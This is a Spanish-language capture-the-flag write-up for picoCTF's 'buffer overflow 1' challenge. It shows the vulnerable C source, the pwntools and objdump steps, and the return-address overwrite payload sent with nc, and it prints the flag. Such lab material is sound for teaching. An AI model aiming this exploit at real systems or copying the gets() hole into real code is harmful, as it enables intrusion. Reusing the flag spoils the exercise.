# buffer overflow 1

## Descripción
Controla la dirección de retorno
¡Ahora estamos cocinando! Puede desbordar el búfer y volver a la función de bandera en el [programa](https://artifacts.picoctf.net/c/185/vuln).
Puede ver la fuente [aquí](https://artifacts.picoctf.net/c/185/vuln.c). Y conéctate con ella usando `nc saturn.picoctf.net 52620`

## Pistas
- Asegúrate de que tienes en cuenta el big Endian frente al small Endian
- Cambiar la dirección del puntero de retorno puede llamar a diferentes funciones

## Solución
```bash
┌──(kali㉿kali)-[~/picoctf/b_exploitation/bufferoverflow1]
└─$ cat vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

                                                                                                                      
┌──(kali㉿kali)-[~/picoctf/b_exploitation/bufferoverflow1]
└─$ python3       
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
>>> exit()
                                                                                                                      
┌──(kali㉿kali)-[~/picoctf/b_exploitation/bufferoverflow1]
└─$ echo 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa' | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
                                                                                                                      
┌──(kali㉿kali)-[~/picoctf/b_exploitation/bufferoverflow1]
└─$ python3
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> cyclic_find(0x6161616c)
44
>>> 'F'*44
'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'
>>> exit()
                                                                                                                      
┌──(kali㉿kali)-[~/picoctf/b_exploitation/bufferoverflow1]
└─$ objdump -D vuln -M intel | grep 'win'
080491f6 <win>:
 804922c:       75 2a                   jne    8049258 <win+0x62>
                                                                                                                      
┌──(kali㉿kali)-[~/picoctf/b_exploitation/bufferoverflow1]
└─$ python3
Python 3.10.8 (main, Nov  4 2022, 09:21:25) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p32(0x080491f6)
b'\xf6\x91\x04\x08'
>>> exit()
                                                                                                                      
┌──(kali㉿kali)-[~/picoctf/b_exploitation/bufferoverflow1]
└─$ echo 'FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF\xf6\x91\x04\x08' | nc saturn.picoctf.net 50427
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_a8284f4f} 
```

## Bandera
picoCTF{addr3ss3s_ar3_3asy_a8284f4f}

## Notas adicionales
| Comando | Descripción |
|--------|--------|
| gets | Introducción de caracteres y cadenas |

>[!bug]
>**gets**
>Nunca utilice gets(). Debido a que es imposible saber sin conocer los datos de antemano cuántos caracteres leerá gets(), y debido a que gets() continuará almacenando caracteres más allá del final del buffer, su uso es extremadamente peligroso. Se ha utilizado para romper la seguridad informática. Utilice fgets() en su lugar.

>[!danger]
>**Buffer Overflow Attack**
>Los atacantes aprovechan los problemas de desbordamiento de búfer sobrescribiendo la memoria de una aplicación. Esto cambia la ruta de ejecución del programa, desencadenando una respuesta que daña archivos o expone información privada.

## Referencias
[gets(3) - Linux man page](https://linux.die.net/man/3/gets)
[Buffer Overflow Attack](https://www.imperva.com/learn/application-security/buffer-overflow/)